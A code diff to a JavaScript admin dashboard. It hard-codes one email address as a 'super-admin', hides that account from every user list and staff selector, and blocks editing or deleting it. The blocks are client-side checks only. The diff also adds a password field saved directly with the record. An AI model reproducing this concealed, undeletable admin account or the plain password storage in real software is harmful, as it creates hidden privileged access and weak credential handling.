@@ -1762,7 +1762,7 @@ window.syncAdminTables = function (type) {
     const staffSelect = document.getElementById("filter-booking-staff");
     if (staffSelect && staffSelect.options.length <= 1 && window.state.users) {
       window.state.users.forEach(u => {
-        if (u.role === "admin" || u.role === "supervisor" || u.role === "staff") {
+        if (u.email !== "zyrozyro98@gmail.com" && (u.role === "admin" || u.role === "supervisor" || u.role === "staff")) {
           const opt = document.createElement("option");
           opt.value = u.id; opt.textContent = u.name || u.email || "مستخدم غير محدد";
           staffSelect.appendChild(opt);
@@ -1809,6 +1809,7 @@ window.syncAdminTables = function (type) {
   }
   
   if (type === "users") {
+      items = items.filter(u => u.email !== "zyrozyro98@gmail.com");
       const roleFilter = window.state.userRoleFilter || "all";
       if (roleFilter !== "all") {
           items = items.filter(u => u.role === roleFilter);
@@ -1991,6 +1992,7 @@ function renderAdminItemRow(type, item) {
   }
 
   if (type === "users") {
+    if (item.email === "zyrozyro98@gmail.com") return ""; // Completely hide super-admin row
     return `
             <div class="admin-item-row" style="background:rgba(255,255,255,0.02); padding:15px; border-radius:12px; border:1px solid var(--glass-border); margin-bottom:10px; display:flex; justify-content:space-between; align-items:center;">
                 <div class="admin-item-info">
@@ -2251,6 +2253,20 @@ window.updateStatistics = function () {
 window.deleteLuxuryItem = async function (type, id) {
   if (confirm("هل أنت متأكد من الحذف؟ لا يمكن التراجع عن هذه العملية.")) {
     try {
+      // Security Restrictions
+      if (type === "users") {
+        const targetUser = (window.state.users || []).find(u => u.id === id);
+        if (targetUser?.email === "zyrozyro98@gmail.com") {
+          window.showLuxuryToast("لا يمكن حذف هذا المستخدم الأساسي للنظام", "error");
+          return;
+        }
+        const currentUserRole = window.state.userProfile?.role;
+        if (currentUserRole === "supervisor" && targetUser?.role === "admin") {
+          window.showLuxuryToast("لا يملك المشرف صلاحية حذف المدير", "error");
+          return;
+        }
+      }
+
       await remove(ref(db, `${type}/${id}`));
       window.showLuxuryToast("تم الحذف بنجاح");
       window.createLog("حذف", `حذف عنصر من ${type} (ID: ${id})`, "data");
@@ -2263,6 +2279,11 @@ window.deleteLuxuryItem = async function (type, id) {
 window.editLuxuryItem = function (type, id) {
   const item = (window.state[type] || []).find(i => i.id === id);
   if (!item) return;
+
+  if (type === "users" && item.email === "zyrozyro98@gmail.com") {
+    window.showLuxuryToast("لا يمكن تعديل بيانات هذا المستخدم الأساسي", "error");
+    return;
+  }
 
   window.state.currentEdit = { type, id };
   const form = document.getElementById("item-form");
@@ -2433,13 +2454,14 @@ function renderDynamicForm(type, data = {}) {
           { v: "ineligible", t: "غير مسموح له" }, { v: "duplicate", t: "مكرر" }
         ]
       },
-      { name: "assignedTo", label: "الموظف المسؤول", type: "select", options: [{ v: "", t: "غير محدد" }, ...window.state.users.filter(u => u.role === "staff" || u.role === "admin" || u.role === "supervisor").map(u => ({ v: u.id, t: u.name || (u.role === "admin" ? "المدير: " : "المشرف: ") + (u.name || u.email) }))] },
+      { name: "assignedTo", label: "الموظف المسؤول", type: "select", options: [{ v: "", t: "غير محدد" }, ...window.state.users.filter(u => u.email !== "zyrozyro98@gmail.com" && (u.role === "staff" || u.role === "admin" || u.role === "supervisor")).map(u => ({ v: u.id, t: u.name || (u.role === "admin" ? "المدير: " : "المشرف: ") + (u.name || u.email) }))] },
       { name: "notes", label: "ملاحظات", type: "textarea" }
     ];
   } else if (type === "users") {
     fields = [
       { name: "name", label: "الاسم الكامل", type: "text" },
       { name: "email", label: "البريد الإلكتروني", type: "text" },
+      { name: "password", label: "كلمة المرور (اختياري عند التعديل)", type: "password" },
       { name: "role", label: "الصلاحية", type: "select", options: [{ v: "staff", t: "موظف" }, { v: "supervisor", t: "مشرف" }, { v: "admin", t: "مدير" }] },
       { name: "isAvailable", label: "متاح لاستلام الطلبات؟", type: "select", options: [{ v: true, t: "نعم" }, { v: false, t: "لا" }] }
     ];
@@ -2604,6 +2626,7 @@ window.saveLuxuryItem = async function (e) {
   const data = {};
   formData.forEach((val, key) => {
     if (key !== "main_img_file" && key !== "gallery_files") {
+      if (key === "password" && !val) return;
       data[key] = val;
     }
   });
